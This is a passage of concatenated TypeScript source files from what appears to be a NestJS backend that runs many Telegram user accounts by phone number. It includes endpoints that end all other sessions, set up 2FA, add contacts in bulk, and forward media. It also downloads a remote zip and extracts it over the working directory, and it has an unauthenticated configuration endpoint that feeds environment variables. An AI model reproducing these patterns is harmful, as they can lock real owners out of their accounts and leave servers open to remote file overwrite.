    try {\r\n            const {\r\n                url,\r\n                method = 'GET',\r\n                headers = {},\r\n                data,\r\n                params,\r\n                responseType = 'json',\r\n                timeout = 30000,\r\n                followRedirects = true,\r\n                maxRedirects = 5\r\n            } = requestDetails;\r\n\r\n            // Log request details\r\n            this.logger.log({\r\n                message: 'Executing HTTP request',\r\n                requestId,\r\n                details: {\r\n                    url,\r\n                    method,\r\n                    headers: this.sanitizeHeaders(headers),\r\n                    params,\r\n                    responseType,\r\n                    timeout,\r\n                    dataSize: data ? JSON.stringify(data).length : 0\r\n                }\r\n            });\r\n\r\n            const response = await axios({\r\n                url,\r\n                method,\r\n                headers,\r\n                data,\r\n                params,\r\n                responseType,\r\n                timeout,\r\n                maxRedirects: followRedirects ? maxRedirects : 0,\r\n                maxContentLength: Infinity,\r\n                maxBodyLength: Infinity,\r\n                validateStatus: () => true,\r\n                decompress: true,\r\n            });\r\n\r\n            // Set response status\r\n            res.status(response.status);\r\n\r\n            // Copy all headers from the upstream response\r\n            Object.entries(response.headers).forEach(([key, value]) => {\r\n                // Skip transfer-encoding as it might conflict with our response\r\n                if (key.toLowerCase() === 'transfer-encoding') return;\r\n\r\n                if (Array.isArray(value)) {\r\n                    res.setHeader(key, value);\r\n                } else {\r\n                    res.setHeader(key, value as string);\r\n                }\r\n            });\r\n\r\n            // Log response details\r\n            this.logger.log({\r\n                message: 'Request completed',\r\n                requestId,\r\n                metrics: {\r\n                    executionTime: Date.now() - startTime,\r\n                    status: response.status,\r\n                    contentType: response.headers['content-type']\r\n                }\r\n            });\r\n\r\n            // For binary responses, send the raw buffer\r\n            if (responseType === 'arraybuffer' ||\r\n                response.headers['content-type']?.includes('application/octet-stream') ||\r\n                response.headers['content-type']?.includes('image/') ||\r\n                response.headers['content-type']?.includes('audio/') ||\r\n                response.headers['content-type']?.includes('video/') ||\r\n                response.headers['content-type']?.includes('application/pdf')) {\r\n\r\n                // Ensure content-type is preserved\r\n                if (!res.getHeader('content-type') && response.headers['content-type']) {\r\n                    res.setHeader('content-type', response.headers['content-type']);\r\n                }\r\n\r\n                // Send raw buffer for binary data\r\n                return res.send(Buffer.from(response.data));\r\n            }\r\n\r\n            // For other types, send as is\r\n            return res.send(response.data);\r\n\r\n        } catch (error) {\r\n            this.logger.error({\r\n                message: 'Request failed',\r\n                requestId,\r\n                error: {\r\n                    message: error.message,\r\n                    code: error.code,\r\n                    stack: error.stack\r\n                }\r\n            });\r\n\r\n            // Handle error response\r\n            if (error.response) {\r\n                // Copy error response headers\r\n                Object.entries(error.response.headers).forEach(([key, value]) => {\r\n                    if (key.toLowerCase() === 'transfer-encoding') return;\r\n                    if (Array.isArray(value)) {\r\n                        res.setHeader(key, value);\r\n                    } else {\r\n                        res.setHeader(key, value as string);\r\n                    }\r\n                });\r\n\r\n                return res.status(error.response.status).send(error.response.data);\r\n            }\r\n\r\n            // Handle network or other errors\r\n            return res.status(500).json({\r\n                message: error.message,\r\n                code: error.code\r\n            });\r\n        }\r\n    }\r\n\r\n    // Helper method to sanitize sensitive headers\r\n    private sanitizeHeaders(headers: Record<string, any>): Record<string, any> {\r\n        const sensitiveHeaders = ['authorization', 'cookie', 'set-cookie'];\r\n        return Object.entries(headers).reduce((acc, [key, value]) => {\r\n            if (sensitiveHeaders.includes(key.toLowerCase())) {\r\n                acc[key] = '[REDACTED]';\r\n            } else {\r\n                acc[key] = value;\r\n            }\r\n            return acc;\r\n        }, {});\r\n    }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule, RequestMethod } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\nimport { TimestampModule } from './components/timestamps/timestamp.module';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n    TimestampModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule,\n    TimestampModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class AppService {\n  getHello(): string {\n    return 'Hello World!';\n  }\n}\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\n    MongooseModule.forRootAsync({\n      useFactory: () => ({\n        uri: process.env.mongouri,\n      }),\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigModule, MongooseModule],\n})\nexport class initModule implements OnModuleDestroy, OnModuleInit {\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\n  async onModuleInit() {\n    console.log(`Started :: ${process.env.clientId}`)\n  }\n\n  async onModuleDestroy() {\n    console.log(\"Init Module Destroying\")\n    await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\n    this.closeConnection();\n  }\n\n  private closeConnection() {\n    console.log(\"Closing mongoose connection\")\n    this.connection.close(true)\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { BotConfig } from '../../utils/TelegramBots.config';\n\n@Injectable()\nexport class ConfigurationService {\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\n        this.setEnv().then(async () => {\n            await BotConfig.getInstance().ready();\n            fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\n        });\n\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.configurationModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return user;\n    }\n\n    async setEnv() {\n        console.log(\"Setting Envs\");\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\n        const data = { ...configuration }\n        for (const key in data) {\n            console.log('setting', key)\n            process.env[key] = data[key];\n        }\n        console.log(\"finished setting env\");\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, Delete, Put, UseInterceptors, UploadedFile, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse, ApiConsumes, ApiBadRequestResponse, ApiNotFoundResponse, ApiOkResponse, ApiUnauthorizedResponse } from '@nestjs/swagger';\nimport { query, Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    UpdateProfileDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType,\n    createGroupDto,\n    ViewOnceMediaDto,\n    MediaSourceType,\n    CreateBotDto\n} from './dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from '../../interfaces/telegram';\nimport { ConnectionStatusDto } from './dto/common-responses.dto';\nimport { FileInterceptor } from '@nestjs/platform-express';\nimport * as multer from 'multer';\nimport { connectionManager } from './utils/connection-manager';\nimport { types } from 'util';\nimport { SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { DeleteHistoryDto } from './dto/delete-chat.dto';\nimport { UpdateUsernameDto } from './dto/update-username.dto';\nimport { SendMessageDto } from './dto/send-message.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) { }\n\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully connected' })\n    @ApiResponse({ status: 400, description: 'Connection failed' })\n    async connect(@Param('mobile') mobile: string) {\n        await connectionManager.getClient(mobile);\n        return { message: 'Connected successfully' };\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully disconnected' })\n    async disconnect(@Param('mobile') mobile: string) {\n        await connectionManager.unregisterClient(mobile);\n        return { message: 'Disconnected successfully' };\n    }\n\n    @Post('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ status: 200, description: 'All clients disconnected successfully' })\n    async disconnectAllClients() {\n        await connectionManager.disconnectAll();\n        return { message: 'All clients disconnected successfully' };\n    }\n\n    // Profile Management\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Profile retrieved successfully' })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.telegramService.getMe(mobile);\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ status: 200, description: 'Entity retrieved successfully' })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.telegramService.getEntity(mobile, entity);\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    async updateProfile(\n        @Param('mobile') mobile: string,\n        @Body() updateProfileDto: UpdateProfileDto\n    ) {\n        return this.telegramService.updateNameandBio(\n            mobile,\n            updateProfileDto.firstName,\n            updateProfileDto.about\n        );\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    async setProfilePhoto(\n        @Param('mobile') mobile: string,\n        @Body() photoDto: ProfilePhotoDto\n    ) {\n        return this.telegramService.setProfilePic(mobile, photoDto.name);\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.telegramService.deleteProfilePhotos(mobile);\n    }\n\n    // Message Operations\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessages(mobile, chatId, limit);\n    }\n\n\n    @Post('message/:mobile')\n    @ApiOperation({ summary: 'Send a Telegram message as a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user account to send the message from',\n        required: true,\n        example: '1234567890',\n    })\n    async sendMessage(\n        @Param('mobile') mobile: string,\n        @Body() dto: SendMessageDto,\n    ) {\n        return this.telegramService.sendMessage(mobile, dto);\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardMessage(\n        @Param('mobile') mobile: string,\n        @Body() forwardDto: ForwardBatchDto\n    ) {\n        return this.telegramService.forwardBulkMessages(\n            mobile,\n            forwardDto.fromChatId,\n            forwardDto.toChatId,\n            forwardDto.messageIds\n        );\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    async processBatchMessages(\n        @Param('mobile') mobile: string,\n        @Body() batchOp: BatchProcessDto\n    ) {\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(\n                                    mobile,\n                                    item.toChatId,\n                                    item.fromChatId,\n                                    item.messageId\n                                );\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({\n        summary: 'Search messages in Telegram',\n        description: 'Search for messages in a specific chat or globally across all chats'\n    })\n    @ApiOkResponse({\n        description: 'Messages successfully found',\n        type: SearchMessagesResponseDto\n    })\n    @ApiBadRequestResponse({ description: 'Invalid request parameters' })\n    @ApiNotFoundResponse({ description: 'Mobile number not registered' })\n    @ApiUnauthorizedResponse({ description: 'Unauthorized access' })\n    async searchMessages(\n        @Param('mobile') mobile: string,\n        @Query() queryParams: SearchMessagesDto\n    ): Promise<SearchMessagesResponseDto> {\n        return this.telegramService.searchMessages(mobile, queryParams);\n    }\n\n    // Channel Operations\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    async getChannelInfo(\n        @Param('mobile') mobile: string,\n        @Query('includeIds') includeIds?: boolean\n    ) {\n        return this.telegramService.getChannelInfo(mobile, includeIds);\n    }\n\n    @Post('forwardMediatoMe/:mobile')\n    @ApiOperation({ summary: 'Forward media messages to me' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel username or ID', required: false })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    async forwardMedia(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel?: string,\n        @Query('fromChatId') fromChatId?: string\n    ) {\n        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n        return this.telegramService.forwardMedia(\n            mobile,\n            channel,\n            fromChatId\n        );\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    async leaveChannel(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel: string\n    ) {\n        return this.telegramService.leaveChannel(mobile, channel);\n    }\n\n    @Patch('username/:mobile')\n    @ApiOperation({ summary: 'Update the Telegram username of a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose username should be updated',\n        required: true,\n        example: '1234567890',\n    })\n    async updateUsername(\n        @Param('mobile') mobile: string,\n        @Body() updateUsernameDto: UpdateUsernameDto,\n    ) {\n        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);\n    }\n\n    // Security & Privacy\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.telegramService.set2Fa(mobile);\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.telegramService.updatePrivacy(mobile);\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    async updatePrivacyBatch(\n        @Param('mobile') mobile: string,\n        @Body() settings: PrivacySettingsDto\n    ) {\n        return this.telegramService.updatePrivacyBatch(mobile, settings);\n    }\n\n    // Session Management\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Active sessions retrieved successfully' })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.getAuths(mobile);\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Other sessions terminated successfully' })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.removeOtherAuths(mobile);\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'New session created successfully' })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.telegramService.createNewSession(mobile);\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.telegramService.getSessionInfo(mobile);\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async terminateSession(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.telegramService.terminateSession(mobile, data);\n    }\n\n    // Monitoring & Health\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return {\n            status: await this.telegramService.getConnectionStatus()\n        };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ summary: 'Get call log statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getCallLogStats(@Param('mobile') mobile: string) {\n        return this.telegramService.getCallLog(mobile);\n    }\n\n    // Contact Management\n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ status: 200, description: 'Contacts added successfully' })\n    async addContactsBulk(\n        @Param('mobile') mobile: string,\n        @Body() contactsDto: AddContactsDto\n    ) {\n        return this.telegramService.addContacts(\n            mobile,\n            contactsDto.phoneNumbers,\n            contactsDto.prefix\n        );\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contacts retrieved successfully' })\n    async getContacts(@Param('mobile') mobile: string) {\n        return await this.telegramService.getContacts(mobile);\n    }\n\n    //To Cleanup\n    @Post('media/send/:mobile')\n    @ApiOperation({ summary: 'Send media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaDto })\n    async sendMedia(\n        @Param('mobile') mobile: string,\n        @Body() sendMediaDto: SendMediaDto\n    ) {\n        const client = await connectionManager.getClient(mobile);\n        if (sendMediaDto.type === MediaType.PHOTO) {\n            return client.sendPhotoChat(\n                sendMediaDto.chatId,\n                sendMediaDto.url,\n                sendMediaDto.caption,\n                sendMediaDto.filename\n            );\n        }\n        return client.sendFileChat(\n            sendMediaDto.chatId,\n            sendMediaDto.url,\n            sendMediaDto.caption,\n            sendMediaDto.filename\n        );\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ summary: 'Download media from a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'messageId', required: true })\n    async downloadMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('messageId') messageId: number,\n        @Res() res: Response\n    ) {\n        return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ summary: 'Send media album (multiple photos/videos)' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaAlbumDto })\n    async sendMediaAlbum(\n        @Param('mobile') mobile: string,\n        @Body() albumDto: MediaAlbumOptions\n    ) {\n        return this.telegramService.sendMediaAlbum(mobile, albumDto);\n    }\n\n    